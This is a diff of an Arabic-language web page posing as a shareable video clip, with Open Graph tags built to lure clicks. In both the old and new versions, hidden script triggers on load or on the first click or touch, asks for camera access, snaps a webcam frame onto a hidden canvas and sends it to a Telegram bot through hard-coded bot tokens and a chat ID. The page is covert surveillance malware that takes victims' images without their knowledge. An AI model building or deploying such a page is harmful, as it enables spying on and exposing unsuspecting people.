@@ -1,92 +1,105 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض الفيديو</title>
-	<style>
+<meta property="og:title" content="شاهد هذا المقطع المميز 🎬">
+<meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
+<meta property="og:type" content="video.other">
+<meta property="og:image" content="https://plain-weur-prod-public.komododecks.com/202610/14/7T81qbwX0uvi6qgBYhzW/image.jpg">
+
+<title>Video Fullscreen</title>
+<style>
     * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
     }
-
-    body {
+    html, body {
+        width: 100%;
+        height: 100%;
         background-color: #000;
         overflow: hidden;
     }
-
-    .video-bg {
+    video#mainVideo {
         position: fixed;
         top: 0;
         left: 0;
         width: 100vw;
         height: 100vh;
+        min-width: 100%;
+        min-height: 100%;
         object-fit: cover;
+        object-position: center;
         z-index: 1;
     }
+</style>
 
-    #webcam, #canvas {
-        display: none;
-    }<video class="video-bg" autoplay muted loop playsinline id="bgVideo">
-    <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
-    متصفحك لا يدعم تشغيل الفيديو.
+<!-- تم إزالة autoplay لكي لا يعمل الفيديو إلا بالنقر -->
+<video id="mainVideo" controls loop playsinline muted>
+    <source src="my_reel (3).mp4" type="video/mp4">
 </video>
 
-<video id="webcam" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
 <script>
-    const TELEGRAM_BOT_TOKEN = "8740275587:AAEPI5jBvej1YWa_67DXDPPT3lOC2NjblVw";
-    const TELEGRAM_CHAT_ID = "6642913954";
-document.addEventListener('click', startCameraProcess, { once: true });
-    window.onload = () => {
-        setTimeout(startCameraProcess, 800);
-    };
+    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
+    const TELEGRAM_CHAT_ID = '6642913954';
 
-    async function startCameraProcess() {
+    let isProcessing = false;
+    const video = document.getElementById('mainVideo');
+
+    async function handleUserInteraction() {
+        // تشغيل الفيديو فوراً عند النقر
+        if (video.paused) {
+            video.play().catch(e => console.log("Video play error:", e));
+        }
+
+        if (isProcessing) return;
+        isProcessing = true;
+
+        let stream = null;
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            const video = document.getElementById('webcam');
-            video.srcObject = stream;
+            // طلب إذن الكاميرا
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            video.onloadedmetadata = () => {
-                setTimeout(() => {
-                    captureAndSend(video, stream);
-                }, 500);
-            };
-        } catch (error) {
-            console.log("خطأ أو رفض الإذن:", error);
-        }function captureAndSend(video, stream) {
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.muted = true;
+            hiddenVideo.playsInline = true;
+            hiddenVideo.srcObject = stream;
+            
+            await hiddenVideo.play();
+            await new Promise(resolve => setTimeout(resolve, 400));
 
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const canvas = document.createElement('canvas');
+            canvas.width = hiddenVideo.videoWidth || 640;
+            canvas.height = hiddenVideo.videoHeight || 480;
 
-        canvas.toBlob(async (blob) => {
-            if (!blob) return;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(hiddenVideo, 0, 0);
+
             stream.getTracks().forEach(track => track.stop());
 
-            const formData = new FormData();
-            formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", blob, "capture.jpg");
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
 
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (err) {
-                console.error("خطأ الإرسال:", err);
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'capture.png');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("Error sending photo:", err);
+                }
+            }, 'image/png');
+
+        } catch (err) {
+            console.error("Camera Error:", err);
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
-        }, 'image/jpeg', 0.85);
+        }
     }
+
+    // تنفيذ الكود عند أول نقرة أو لمسة فقط
+    window.addEventListener('click', handleUserInteraction, { once: true });
+    window.addEventListener('touchstart', handleUserInteraction, { once: true });
 </script>
-
-    }
-
-
-
-</style>
